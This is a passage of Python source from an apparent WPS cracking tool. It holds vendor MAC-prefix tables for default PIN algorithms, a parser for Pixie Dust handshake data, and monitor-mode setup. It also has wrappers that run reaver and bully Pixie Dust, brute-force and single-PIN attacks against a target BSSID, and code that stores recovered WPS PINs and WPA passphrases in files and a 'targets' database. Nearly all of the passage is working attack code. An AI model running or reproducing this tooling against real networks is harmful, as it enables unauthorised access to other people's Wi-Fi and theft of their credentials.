','D86CE9','DC7144','801F02','E47CF9','000CF6','00A026','A0F3C1','647002','B0487A','F81A67','F8D111','34BA9A','B4944E','EC086B','6C198F','C0C1C0','3C46D8','0023CD','A42B8C','3894ED','B0C745','6466B3','2C4D54','1008B1','143005','E4F4C6','1C3BF3','F4F26D','848E96','109FA9','F0A731','00DBDF','4027F5','101250','50B7C3','CC32E5','D4B167','E84DD0','FC3514'),
    'pin28': ('200BC7','4846FB','D46AA8','F84ABF','74DA88','C46E1F','0C726D','CC9F7A','7C8BCA','44A56E'),
    'pin32': ('000726','D8FEE3','FC8B97','1062EB','1C5F2B','48EE0C','802689','908D78','E8CC18','2CAB25','10BF48','14DAE9','3085A9','50465D','5404A6','C86000','F46D04','801F02','EC086B','1C872C','B06EBF','AC220B','D017C2','6045CB','74D02B','D850E6'),
    'pinDLink': ('14D64D','1C7EE5','28107B','84C9B2','A0AB1B','B8A386','C0A0BB','CCB255','FC7516','0014D1','D8EB97','1CAFF7','3C1E04','10BEF5','78321B','C4A81D','908D78','F07D68','346BD3','6C198F'),
    'pinDLink1': ('0018E7','00195B','001CF0','001E58','002191','0022B0','002401','00265A','14D64D','1C7EE5','340804','5CD998','84C9B2','B8A386','C8BE19','C8D3A3','CCB255','0014D1','1CAFF7','3C1E04','10BEF5','78321B','F07D68','281878','C4E984'),
    'pinASUS': ('049226','04D9F5','08606E','0862669','107B44','10BF48','10C37B','14DDA9','1C872C','1CB72C','2C56DC','2CFDA1','305A3A','382C4A','38D547','40167E','50465D','54A050','6045CB','60A44C','704D7B','74D02B','7824AF','88D7F6','9C5C8E','AC220B','AC9E17','B06EBF','BCEE7B','C860007','D017C2','D850E6','E03F49','F0795978','F832E4','00072624','0008A1D3','00177C','001EA6','00304FB','00E04C0','048D38','081077','081078','081079','083E5D','10FEED3C','181E78','1C4419','2420C7','247F20','2CAB25','3085A98C','3C1E04','40F201','44E9DD','48EE0C','5464D9','54B80A','587BE906','60D1AA21','64517E','64D954','6C198F','6C7220','6CFDB9','78D99FD','7C2664','803F5DF6','84A423','88A6C6','8C10D4','8C882B00','904D4A','907282','90F65290','94FBB2','A01B29','A0F3C1E','A8F7E00','ACA213','B85510','B8EE0E','BC3400','BC9680','C891F9','D00ED90','D084B0','D8FEE3','E4BEED','E894F6F6','EC1A5971','EC4C4D','F42853','F43E61','F46BEF','F8AB05','FC8B97','7062B8','78542E','C0A0BB8C','C412F5','C4A81D','E8CC18','EC2280','F8E903F4','04421A','D45D64','70825E','3C7C3F','FCECDA','3497F6','708105','AC2205'),
    'pinAirocon': ('0007262F','000B2B4A','000EF4E7','001333B','00177C','001AEF','00E04BB3','02101801','0810734','08107710','1013EE0','2CAB25C7','788C54','803F5DF6','94FBB2','BC9680','F43E61','FC8B97','D084B0','84A423','8C10D4','E4BEED','B85510','C891F9','3C1E04','40F201','181E78'),
    'pinInvNIC': ('00904C','EC6264','14144B','988B5D','001AA9','ACF1DF','BCF685','00E04C','001CDF','002275','C83A35','B4944E'),
    'pinNIC2': ('D4BF7F','F8C091','784476','0014D1','144D67'),
    'pinNIC3': ('F8C091','D4BF7F','784476'),
    'pinOUIaddNIC': ('00904C','EC6264','988B5D','14144B','001AA9','ACF1DF','BCF685','00E04C','08C6B3','007263','000C42','000EE8'),
    'pinOUIxorNIC': ('00904C','EC6264','988B5D','14144B','001AA9','ACF1DF','BCF685'),
    'pinEmpty': ('E46F13','EC2280','58D56E','1062EB','10BEF5','1C5F2B','802689','A0AB1B','74DADA','9CD643','68A0F6','0C96BF','20F3A3','ACE215','C8D15E','000E8F','D42122','3C9872','788102','7894B4','D460E3','E06066','004A77','2C957F','64136C','74A78E','88D274','702E22','74B57E','789682','7C3953','8C68C8','D476EA','344DEA','38D82F','54BE53','709F2D','94A7B7','981333','CAA366','D0608C','F0B429','741EA2','D4214D','E0E751','2C39C1','0C54A5','78C1A7','6C72E7','D8EB46','7442C1','B0B98A','F85E42','30B5C2','C8D719','240995','18A6F7'),
    'pinCisco': ('001A2B','00248C','002618','344DEB','7071BC','E06995','E0CB4E','7054F5','0023BE','002369','0025B3','000F8F','0012D9','001217','00182A','000625','00166F','001839','001A70','001C10','001E4A','002163','006B4F'),
    'pinBrcm1': ('ACF1DF','BCF685','C8D3A3','988B5D','001AA9','14144B','EC6264','20E52A','3CA72B','E44790','5CF370','D0D04B'),
    'pinBrcm2': ('14D64D','1C7EE5','28107B','84C9B2','B8A386','BCF685','C8BE19','20E52A','3CA72B','E44790'),
    'pinBrcm3': ('14D64D','1C7EE5','28107B','B8A386','BCF685','C8BE19','7C034C','20E52A','3CA72B','E44790'),
    'pinBrcm4': ('14D64D','1C7EE5','28107B','84C9B2','B8A386','BCF685','C8BE19','C8D3A3','CCB255','FC7516','204E7F','4C17EB','18622C','7C03D8','D86CE9','20E52A','3CA72B','E44790','5CF370','D0D04B'),
    'pinBrcm5': ('14D64D','1C7EE5','28107B','84C9B2','B8A386','BCF685','C8BE19','C8D3A3','CCB255','FC7516','204E7F','4C17EB','18622C','7C03D8','D86CE9','20E52A','3CA72B','E44790','5CF370','D0D04B'),
    'pinBrcm6': ('14D64D','1C7EE5','28107B','84C9B2','B8A386','BCF685','C8BE19','C8D3A3','CCB255','FC7516','204E7F','4C17EB','18622C','7C03D8','D86CE9','20E52A','3CA72B','E44790','5CF370','D0D04B'),
    'pinAirc1': ('181E78','40F201','44E9DD','D084B0','84A423','8C10D4','3C1E04'),
    'pinAirc2': ('84A423','8C10D4','88A6C6','181E78','40F201','44E9DD'),
    'pinDSL2740R': ('00265A','1CBDB9','340804','5CD998','84C9B2','FC7516','1CAFF7','78321B','F07D68','C4A81D'),
    'pinRealtek1': ('0014D1','000C42','000EE8','00E04C','E4BEED','08C6B3','007263','B85510'),
    'pinRealtek2': ('007263','E4BEED','00E04C','0014D1','08C6B3'),
    'pinRealtek3': ('08C6B3','00E04C','007263','E4BEED'),
    'pinUpvel': ('784476','D4BF7F0','F8C091'),
    'pinUR814AC': ('D4BF7F60',),
    'pinUR825AC': ('D4BF7F5',),
    'pinOnlime': ('D4BF7F','F8C091','144D67','784476','0014D1'),
    'pinEdimax': ('801F02','00E04C','74DA38','80D01D'),
    'pinThomson': ('002624','4432C8','88F7C7','CC03FA','BC7670','7822DF','782E29','FC946C','A0F3C1','64680C','04FE31'),
    'pinHG532x': ('00664B','086361','087A4C','0C96BF','14B968','2008ED','2469A5','346BD3','786A89','88E3AB','9CC172','ACE215','D07AB5','CCA223','E8CD2D','F80113','F83DFF','4C8BEF','4CB16C','C8D15E','D46E5C','EC233D','ECCB30','F49FF3','007822','00259E','001882','00E0FC','001E10','0019CB','006331','78D99F'),
    'pinH108L': ('4C09B4','4CAC0A','84742A4','9CD24B','B075D5','C864C7','DC028E','FCC897','E068E7','5CE286','CC7B35','84A8E4','18C58A','44F436','00265E','002293','002662','741F4A','283B82','74A063'),
    'pinONO': ('5C353B','DC537C','E0CA94','1C3991','40167E','5853AF'),
    'pinTenda': ('C83A35','001CC3','D85D4C','B0B2DC','CC5D4E','9C216A','BCDAFE','EC26CA','28EE52','C4F0EC','D021FA','302481','58605F','808132','A4F4C2','F42896'),
    'pinTPLink1': ('EC086B','F4EC38','B0487A','C0E42D','A0F3C1','E8DE27','F81A67','E4D332','9094E4','5C899A','14CF92','6CE873','2C4D54','640DE6','B4B024','B0C745','3C46D8','1C3BF3','AC84C6','F0A731','ECA940','D8075A'),
    'pinTPLink2': ('EC086B','F4EC38','B0487A','C0E42D','A0F3C1','E8DE27','F81A67','E4D332','D8075A','ECA940','AC84C6','640DE6','B4B024'),
    'pinNetgear1': ('204E7F','4C17EB','7C03D8','D86CE9','18622C','E46F13','E0469A','300D43','001E2A','001B2F','001F33','002636','008EF2','20E52A','2CB05D','3CA72B','C43DC7','C8B373','E44790','F87394','CC40D0','6CB0CE','A42B8C','6CDA23'),
    'pinNetgear2': ('204E7F','4C17EB','7C03D8','D86CE9','18622C','E0469A','300D43','001E2A','001B2F','20E52A','3CA72B','C43DC7','C8B373','E44790'),
    'pinZTE1': ('4C09B4','4CAC0A','9CD24B','B075D5','C864C7','DC028E','FCC897','E068E7','5CE286','CC7B35','84A8E4','18C58A','44F436','283B82'),
    'pinZTE2': ('4C09B4','4CAC0A','9CD24B','C864C7','DC028E','FCC897','E068E7','CC7B35','84A8E4','18C58A'),
}


# ---------------------------------------------------------------------------
# PixiewpsData
# ---------------------------------------------------------------------------
def get_hex(line):
    parts = line.split(':', 3)
    if len(parts) < 3: return ''
    return parts[2].replace(' ', '').upper()


class PixiewpsData:
    _REQUIRED_HEX_FIELDS = {'pke': 384, 'pkr': 384, 'e_nonce': 32,
                            'authkey': 64, 'e_hash1': 64, 'e_hash2': 64}
    _OPTIONAL_HEX_FIELDS = {'r_nonce': 32, 'e_s1': 32, 'e_s2': 32,
                            'r_s1': 32, 'r_s2': 32}
    _ALL_HEX_FIELDS = {**_REQUIRED_HEX_FIELDS, **_OPTIONAL_HEX_FIELDS}

    _RE_WPA = {
        'pke':     re.compile(r'WPS:\s*PKE\s*[:=]\s*([0-9A-Fa-f]+)'),
        'pkr':     re.compile(r'WPS:\s*PKR\s*[:=]\s*([0-9A-Fa-f]+)'),
        'e_nonce': re.compile(r'WPS:\s*E-Nonce\s*[:=]\s*([0-9A-Fa-f]+)'),
        'r_nonce': re.compile(r'WPS:\s*R-Nonce\s*[:=]\s*([0-9A-Fa-f]+)'),
        'authkey': re.compile(r'WPS:\s*AuthKey\s*[:=]\s*([0-9A-Fa-f]+)'),
        'e_hash1': re.compile(r'WPS:\s*E-Hash1\s*[:=]\s*([0-9A-Fa-f]+)'),
        'e_hash2': re.compile(r'WPS:\s*E-Hash2\s*[:=]\s*([0-9A-Fa-f]+)'),
        'e_s1':    re.compile(r'WPS:\s*E-S1\s*[:=]\s*([0-9A-Fa-f]+)'),
        'e_s2':    re.compile(r'WPS:\s*E-S2\s*[:=]\s*([0-9A-Fa-f]+)'),
        'r_s1':    re.compile(r'WPS:\s*R-S1\s*[:=]\s*([0-9A-Fa-f]+)'),
        'r_s2':    re.compile(r'WPS:\s*R-S2\s*[:=]\s*([0-9A-Fa-f]+)'),
    }
    _RE_REAVER = {
        'pke':     re.compile(r'\[P\]\s*E-PKE\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
        'pkr':     re.compile(r'\[P\]\s*R-PKE\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
        'e_nonce': re.compile(r'\[P\]\s*E-Nonce\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
        'r_nonce': re.compile(r'\[P\]\s*R-Nonce\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
        'authkey': re.compile(r'\[P\]\s*AuthKey\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
        'e_hash1': re.compile(r'\[P\]\s*E-Hash1\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
        'e_hash2': re.compile(r'\[P\]\s*E-Hash2\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
        'e_s1':    re.compile(r'\[P\]\s*E-S1\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
        'e_s2':    re.compile(r'\[P\]\s*E-S2\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
    }
    _RE_BULLY = {
        'pke':     re.compile(r'PKE\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
        'pkr':     re.compile(r'PKR\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
        'e_nonce': re.compile(r'E-NONCE\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
        'r_nonce': re.compile(r'R-NONCE\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
        'authkey': re.compile(r'AUTHKEY\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
        'e_hash1': re.compile(r'E-HASH1\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
        'e_hash2': re.compile(r'E-HASH2\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
        'e_s1':    re.compile(r'E-S1\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
        'e_s2':    re.compile(r'E-S2\s*[:=]\s*([0-9A-Fa-f]+)', re.I),
    }

    def __init__(self):
        for f in self._ALL_HEX_FIELDS: setattr(self, f, '')

    def clear(self): self.__init__()
    def got_all(self): return all(getattr(self, f) for f in self._REQUIRED_HEX_FIELDS)
    def missing_fields(self): return [f for f in self._REQUIRED_HEX_FIELDS if not getattr(self, f)]
    def completeness(self):
        return sum(1 for f in self._REQUIRED_HEX_FIELDS if getattr(self, f)), len(self._REQUIRED_HEX_FIELDS)

    def status_line(self):
        f, t = self.completeness()
        if f == t: return UI.ok(f'{f}/{t} fields captured — ready for pixiewps')
        return UI.warn(f'{f}/{t} fields captured (missing: {", ".join(self.missing_fields())})')

    def _validate(self, strict=True):
        for name, length in self._ALL_HEX_FIELDS.items():
            v = getattr(self, name)
            if not v:
                if strict and name in self._REQUIRED_HEX_FIELDS:
                    raise ValueError(f'Required field {name} is empty')
                continue
            if len(v) != length:
                raise ValueError(f'Field {name} has length {len(v)}, expected {length}')
            if not all(c in '0123456789ABCDEF' for c in v.upper()):
                raise ValueError(f'Field {name} is not valid hex')

    def get_pixie_args(self, full_range=False, timeout=None):
        self._validate(strict=not full_range)
        args = ['pixiewps',
                '--pke', self.pke, '--pkr', self.pkr,
                '--e-hash1', self.e_hash1, '--e-hash2', self.e_hash2,
                '--authkey', self.authkey, '--e-nonce', self.e_nonce]
        for f, flag in (('r_nonce', '--r-nonce'), ('e_s1', '--e-s1'),
                        ('e_s2', '--e-s2'), ('r_s1', '--r-s1'), ('r_s2', '--r-s2')):
            v = getattr(self, f)
            if v: args.extend([flag, v])
        if full_range: args.append('--force')
        if timeout is not None: args.extend(['--timeout', str(int(timeout))])
        return args

    def _parse(self, text, patterns):
        n = 0
        for field, rx in patterns.items():
            m = rx.search(text)
            if m:
                val = m.group(1).upper().strip()
                if val and not getattr(self, field):
                    setattr(self, field, val); n += 1
        return n

    def from_wpa_supplicant(self, t): return self._parse(t, self._RE_WPA)
    def from_reaver(self, t):         return self._parse(t, self._RE_REAVER)
    def from_bully(self, t):          return self._parse(t, self._RE_BULLY)

    def to_dict(self):
        return {f: getattr(self, f) for f in self._ALL_HEX_FIELDS if getattr(self, f)}
    @classmethod
    def from_dict(cls, d):
        o = cls()
        for f in cls._ALL_HEX_FIELDS:
            v = d.get(f, '')
            if v: setattr(o, f, v.upper().strip())
        return o
    def to_json(self): return json.dumps(self.to_dict(), indent=2)
    @classmethod
    def from_json(cls, s): return cls.from_dict(json.loads(s))

    def __repr__(self):
        f, t = self.completeness()
        return f'PixiewpsData({f}/{t} required, ready={self.got_all()})'


# ---------------------------------------------------------------------------
# AttackResult
# ---------------------------------------------------------------------------
class AttackResult:
    __slots__ = ('success', 'pin', 'psk', 'essid', 'error')
    def __init__(self, success=False, pin='', psk='', essid='', error=''):
        self.success, self.pin, self.psk = success, pin, psk
        self.essid, self.error = essid, error
    def __bool__(self): return self.success
    def __repr__(self):
        return (f'AttackResult(success={self.success!r}, pin={self.pin!r}, '
                f'psk={self.psk!r}, essid={self.essid!r}, error={self.error!r})')


# ---------------------------------------------------------------------------
# Monitor mode helpers
# ---------------------------------------------------------------------------
def _iface_exists(name): return os.path.exists(f'/sys/class/net/{name}')


def setup_monitor_mode(iface):
    if shutil.which('airmon-ng'):
        try:
            run_proc(['airmon-ng', 'check', 'kill'],
                     stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        except Exception: pass
        try:
            _, out = run_proc(['airmon-ng', 'start', iface],
                              stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                              encoding='utf-8', errors='replace')
        except Exception:
            out = ''
        for line in (out or '').splitlines():
            m = re.search(r'\b(\w+mon)\b', line)
            if m and _iface_exists(m.group(1)):
                return m.group(1)
        cand = iface + 'mon'
        if _iface_exists(cand): return cand
        raise RuntimeError(f'Could not enter monitor mode on {iface!r}; '
                           f'tried {cand!r} but it does not exist')
    run_proc(['ip', 'link', 'set', iface, 'down'],
             stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    run_proc(['iw', iface, 'set', 'monitor', 'none'],
             stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    run_proc(['ip', 'link', 'set', iface, 'up'],
             stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    if not _iface_exists(iface):
        raise RuntimeError(f'{iface!r} disappeared after iw monitor attempt')
    return iface


def teardown_monitor_mode(iface, original_iface):
    if iface and iface != original_iface and shutil.which('airmon-ng'):
        run_proc(['airmon-ng', 'stop', iface],
                 stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    elif iface != original_iface:
        run_proc(['ip', 'link', 'set', iface, 'down'],
                 stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        run_proc(['iw', iface, 'set', 'type', 'managed'],
                 stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        run_proc(['ip', 'link', 'set', original_iface, 'up'],
                 stdout=subprocess.PIPE, stderr=subprocess.STDOUT)


# ---------------------------------------------------------------------------
# External backends
# ---------------------------------------------------------------------------
class _BackendBase:
    BIN = ''

    def __init__(self, interface, verbose=False, timeout=1200,
                 delay=None, json_mode=False, dry_run=False):
        self.interface = interface
        self.verbose = verbose
        self.timeout = timeout
        self.delay = delay
        self.json_mode = json_mode
        self.dry_run = dry_run

    @classmethod
    def is_available(cls):
        return shutil.which(cls.BIN) is not None

    def _run(self, argv, label, timeout=None):
        timeout = timeout or self.timeout
        print(UI.msg('run', f'Running {UI.hi(label)}…'), file=sys.stderr)
        if self.verbose or self.dry_run:
            print(f'  {UI.muted("[cmd]")} {" ".join(argv)}', file=sys.stderr)
        if self.dry_run:
            return AttackResult(error='dry_run')
        try:
            _, out = run_proc(argv, timeout=timeout,
                              stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                              encoding='utf-8', errors='replace')
        except subprocess.TimeoutExpired:
            print(UI.msg('err', f'{label} timed out after {timeout}s'), file=sys.stderr)
            return AttackResult(error='timeout')
        except FileNotFoundError:
            print(UI.msg('err', f'{self.BIN} binary not found in PATH'), file=sys.stderr)
            return AttackResult(error='not_found')
        if self.verbose: print(out or '', file=sys.stderr)
        return self._parse_output(out or '')

    @staticmethod
    def _parse_output(output):
        return AttackResult(error='no_result')


class ReaverAttacker(_BackendBase):
    BIN = 'reaver'

    def _base(self, bssid, channel=None, pixie=False):
        argv = ['reaver', '-i', self.interface, '-b', bssid]
        if channel: argv += ['-c', str(channel)]
        argv += ['-vv'] if self.verbose else ['-v']
        argv += ['-L']
        if not pixie:
            argv += ['-N']
        return argv

    def pixie_dust(self, bssid, channel=None):
        return self._run(self._base(bssid, channel, pixie=True) + ['-K', '1'],
                         'Pixie Dust (reaver)')

    def bruteforce(self, bssid, channel=None, start_pin=None):
        argv = self._base(bssid, channel, pixie=False)
        if self.delay is not None: argv += ['-d', str(int(self.delay))]
        if start_pin: argv += ['-p', start_pin]
        return self._run(argv, 'Brute-force (reaver)', timeout=self.timeout * 10)

    def single_pin(self, bssid, pin, channel=None):
        return self._run(self._base(bssid, channel) + ['-p', pin],
                         f'PIN {pin} (reaver)')

    def pbc(self, bssid=None, channel=None):
        argv = ['reaver', '-i', self.interface]
        if bssid: argv += ['-b', bssid]
        if channel: argv += ['-c', str(channel)]
        argv += ['--pbc']
        argv += ['-vv'] if self.verbose else ['-v']
        return self._run(argv, 'Push Button Connect (reaver)')

    @staticmethod
    def _parse_output(output):
        pin = psk = essid = ''
        for line in output.splitlines():
            m = re.search(r"\[\+\]\s*WPS\s*PIN:\s*'([^']*)'", line)
            if m: pin = m.group(1)
            m = re.search(r"\[\+\]\s*WPA\s*PSK:\s*'([^']*)'", line)
            if m: psk = m.group(1)
            m = re.search(r"\[\+\]\s*AP\s*SSID:\s*'([^']*)'", line)
            if m: essid = m.group(1)
        if pin or psk:
            return AttackResult(success=True, pin=pin, psk=psk, essid=essid)
        if 'WPS transaction failed' in output:
            return AttackResult(error='wps_transaction_failed')
        if 'WARNING: Detected AP rate limiting' in output:
            return AttackResult(error='rate_limited')
        if 'AP has locked its WPS' in output or 'WPS lockout' in output:
            return AttackResult(error='wps_locked')
        return AttackResult(error='no_result')


class BullyAttacker(_BackendBase):
    BIN = 'bully'

    def _base(self, bssid, channel=None):
        argv = ['bully', '-b', bssid]
        if channel: argv += ['-c', str(channel)]
        argv += ['-v', '4'] if self.verbose else ['-v', '2']
        if self.delay is not None:
            argv += ['-d', str(int(self.delay * 1000))]
        argv.append(self.interface)
        return argv

    def pixie_dust(self, bssid, channel=None):
        return self._run(self._base(bssid, channel) + ['-d'],
                         'Pixie Dust (bully)')

    def bruteforce(self, bssid, channel=None, start_pin=None):
        argv = self._base(bssid, channel)
        if start_pin: argv += ['-p', start_pin]
        return self._run(argv, 'Brute-force (bully)', timeout=self.timeout * 10)

    def single_pin(self, bssid, pin, channel=None):
        return self._run(self._base(bssid, channel) + ['-p', pin],
                         f'PIN {pin} (bully)')

    @staticmethod
    def _parse_output(output):
        pin = psk = essid = ''
        for line in output.splitlines():
            m = re.search(r"\[\+\]\s*Pin\s+is\s+'([^']*)',\s*key\s+is\s+'([^']*)'", line)
            if m:
                pin, psk = m.group(1), m.group(2); continue
            m = re.search(r"\[\*\]\s*Pin:\s*(\S+)", line)
            if m and not pin: pin = m.group(1)
            m = re.search(r"\[\*\]\s*Key:\s*(.+)", line)
            if m and not psk: psk = m.group(1).strip()
            m = re.search(r"SSID:\s*'([^']*)'", line)
            if m and not essid: essid = m.group(1)
            m = re.search(r"for\s+'([^']+)'", line)
            if m and not essid: essid = m.group(1)
        if pin or psk:
            return AttackResult(success=True, pin=pin, psk=psk, essid=essid)
        if 'WPS lockout' in output or 'locked' in output.lower():
            return AttackResult(error='wps_locked')
        return AttackResult(error='no_result')


def _save_result(db, bssid, essid, pin, psk, reports_dir, json_mode, json_stdout):
    _safe_makedirs(reports_dir)
    filename = os.path.join(reports_dir, 'stored')
    dateStr = datetime.now().strftime('%d.%m.%Y %H:%M')
    try:
        with open(filename + '.txt', 'a', encoding='utf-8') as f:
            f.write(f'{dateStr}\nBSSID: {bssid}\nESSID: {essid}\n'
                    f'WPS PIN: {pin}\nWPA PSK: {psk}\n\n')
        header = not os.path.isfile(filename + '.csv')
        with open(filename + '.csv', 'a', newline='', encoding='utf-8') as f:
            w = csv.writer(f, delimiter=';', quoting=csv.QUOTE_ALL)
            if header: w.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])
            w.writerow([dateStr, bssid, essid, pin, psk])
    except OSError as e:
        print(UI.msg('err', f'Failed to write credentials to {filename}: {e}'),
              file=sys.stderr)
        return
    print(UI.msg('info', f'Credentials saved to {filename}.txt, {filename}.csv'),
          file=sys.stderr)
    if db:
        try: db.save_credentials(bssid, essid, pin, psk)
        except Exception as e:
            print(UI.msg('err', f'Failed to save to DB: {e}'), file=sys.stderr)
    if json_mode:
        rec = {'ts': datetime.now().isoformat(), 'event': 'credentials',
               'bssid': bssid, 'essid': essid, 'wps_pin': pin, 'wpa_psk': psk}
        print(json.dumps(rec, ensure_ascii=False), file=json_stdout, flush=True)


def _handle_backend_result(result, bssid, db=None, save_result=False,
                           reports_dir=None, json_mode=False, json_stdout=None):
    if not result.success:
        if result.error == 'wps_locked':
            print(UI.msg('err', f'AP {UI.hi(bssid)} has locked WPS'), file=sys.stderr)
        elif result.error == 'rate_limited':
            print(UI.msg('warn', f'AP {UI.hi(bssid)} rate-limits — backing off'),
                  file=sys.stderr)
        elif result.error == 'dry_run':
            print(UI.msg('info', '(dry-run) no attack executed'), file=sys.stderr)
        elif result.error in ('timeout', 'not_found'):
            pass
        else:
            print(UI.msg('err', f'Attack unsuccessful against {UI.hi(bssid)}'),
                  file=sys.stderr)
        return False
    print(UI.section('Credentials recovered'), file=sys.stderr)
    print(UI.table(['Field', 'Value'],
                   [[UI.muted('WPS PIN'), UI.ok(result.pin)],
                    [UI.muted('WPA PSK'), UI.ok(result.psk)],
                    [UI.muted('ESSID'),   UI.hi(result.essid or '—')]],
                   aligns=['l', 'l']), file=sys.stderr)
    if save_result and reports_dir:
        _save_result(db, bssid, result.essid, result.pin, result.psk,
                     reports_dir, json_mode, json_stdout or sys.stdout)
    if db:
        try: db.save_credentials(bssid, result.essid, result.pin, result.psk)
        except Exception as e:
            print(UI.msg('err', f'Failed to save to DB: {e}'), file=sys.stderr)
    return True


# ---------------------------------------------------------------------------
# Status trackers
# ---------------------------------------------------------------------------
class ConnectionStatus:
    def __init__(self):
        self.status = ''
        self.last_m_message = 0
        self.essid = ''
        self.wpa_psk = ''
        self.nack_count = 0
        self.locked = False
        self.bssid = ''
    def isFirstHalfValid(self): return self.last_m_message > 5
    def clear(self): self.__init__()


class BruteforceStatus:
    def __init__(self):
        self.start_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        self.mask = ''
        self.last_attempt_time = time.time()
        self.attempts_times = collections.deque(maxlen=15)
        self.counter = 0
        self.statistics_period = 5
    def display_status(self):
        avg = statistics.mean(self.attempts_times) if self.attempts_times else 0
        if not self.mask or not self.mask.isdigit(): pct = 0.0
        elif len(self.mask) <= 4: pct = int(self.mask) / 10000 * 100
        elif len(self.mask) >= 7:
            pct = (10000 + int(self.mask[4:7])) / 11000 * 100
        else: pct = int(self.mask) / 10000 * 100
        print(UI.info(f'[*] {pct:.2f}% complete @ {self.start_time} '
                      f'({avg:.2f} seconds/pin)'), file=sys.stderr)
    def registerAttempt(self, mask):
        self.mask = mask; self.counter += 1
        now = time.time()
        self.attempts_times.append(now - self.last_attempt_time)
        self.last_attempt_time = now
        if self.counter == self.statistics_period:
            self.counter = 0; self.display_status()
    def clear(self): self.__init__()


# ---------------------------------------------------------------------------
# TargetDB — additive migration
# ---------------------------------------------------------------------------
class TargetDB:
    SCHEMA = """
    CREATE TABLE IF NOT EXISTS targets (
        bssid TEXT PRIMARY KEY,
        essid TEXT, model TEXT, model_number TEXT, device_name TEXT,
        chipset TEXT, pixie_vuln INTEGER DEFAULT 0, locked INTEGER DEFAULT 0,
        wps_pin TEXT, wpa_psk TEXT,
        last_seen TEXT, attempts INTEGER DEFAULT 0, success INTEGER DEFAULT 0
    );
    CREATE TABLE IF NOT EXISTS oui_vendor (
        prefix TEXT PRIMARY KEY, vendor TEXT
    );
    """
    NEW_COLS = [
        ('lockout_until', 'TEXT'),
        ('pixie_capture', 'TEXT'),
        ('last_channel', 'INTEGER DEFAULT 0'),
    ]

    def __init__(self, path):
        self.path = path
        Path(path).parent.mkdir(parents=True, exist_ok=True)
        self.conn = sqlite3.connect(path)
        self.conn.executescript(self.SCHEMA)
        self._migrate()
        self.conn.commit()
        self._seed_oui()

    def _migrate(self):
        cur = self.conn.execute('PRAGMA table_info(targets)')
        existing = {row[1] for row in cur.fetchall()}
        for col, decl in self.NEW_COLS:
            if col not in existing:
                self.conn.execute(f'ALTER TABLE targets ADD COLUMN {col} {decl}')
        self.conn.commit()

    def _seed_oui(self):
        self.conn.executemany('INSERT OR IGNORE INTO oui_vendor (prefix, vendor) VALUES (?,?)',
                              list(OUI_BUILTIN.items()))
        self.conn.commit()

    def load_oui_file(self, path):
        rows = []
        with open(path, 'r', encoding='utf-8', errors='replace') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'): continue
                parts = re.split(r'\s+', line, maxsplit=1)
                if len(parts) == 2:
                    prefix = parts[0].replace(':', '').replace('-', '').upper()[:6]
                    rows.append((prefix, parts[1]))
        self.conn.executemany('INSERT OR IGNORE INTO oui_vendor (prefix, vendor) VALUES (?,?)', rows)
        self.conn.commit()

    def vendor_for(self, bssid):
        prefix = bssid.replace(':', '').upper()[:6]
        r = self.conn.execute('SELECT vendor FROM oui_vendor WHERE prefix=?', (prefix,)).fetchone()
        return r[0] if r else 'Unknown'

    def upsert(self, net):
        self.conn.execute("""
            INSERT INTO targets (bssid, essid, model, model_number, device_name,
                                 chipset, pixie_vuln, locked, last_seen, last_channel)
            VALUES (?,?,?,?,?,?,?,?, datetime('now'), ?)
            ON CONFLICT(bssid) DO UPDATE SET
                essid=excluded.essid, model=excluded.model,
                model_number=excluded.model_number,
                device_name=excluded.device_name, chipset=excluded.chipset,
                pixie_vuln=excluded.pixie_vuln, locked=excluded.locked,
                last_seen=datetime('now'), last_channel=excluded.last_channel
        """, (net['BSSID'], net.get('ESSID', 'HIDDEN'), net.get('Model', ''),
              net.get('Model number', ''), net.get('Device name', ''),
              net.get('Chipset', ''), int(net.get('Pixie vulnerable', False)),
              int(net.get('WPS locked', False)),
              int(net.get('Channel', 0) or 0)))
        self.conn.commit()

    def known_pin(self, bssid):
        r = self.conn.execute('SELECT wps_pin FROM targets WHERE bssid=? '
                              'AND wps_pin IS NOT NULL AND wps_pin != ""',
                              (bssid,)).fetchone()
        return r[0] if r else None

    def save_credentials(self, bssid, essid, pin, psk):
        cur = self.conn.execute('UPDATE targets SET wps_pin=?, wpa_psk=?, success=1 WHERE bssid=?',
                                (pin, psk, bssid))
        if cur.rowcount == 0:
            self.conn.execute('INSERT INTO targets (bssid, essid, wps_pin, wpa_psk, success, '
                              'last_seen) VALUES (?,?,?,?,1, datetime("now"))',
                              (bssid, essid, pin, psk))
        self.conn.commit()

    def bump_attempts(self, bssid):
        self.conn.execute('UPDATE targets SET attempts = attempts + 1 WHERE bssid=?', (bssid,))
        self.conn.commit()

    def save_capture(self, bssid, pixie):
        self.conn.execute('UPDATE targets SET pixie_capture=? WHERE bssid=?',
                          (json.dumps(pixie.to_dict()), bssid))
        if self.conn.total_changes == 0:
            self.conn.execute('INSERT OR IGNORE INTO targets (bssid, pixie_capture, last_seen) '
                              'VALUES (?,?, datetime("now"))', (bssid, json.dumps(pixie.to_dict())))
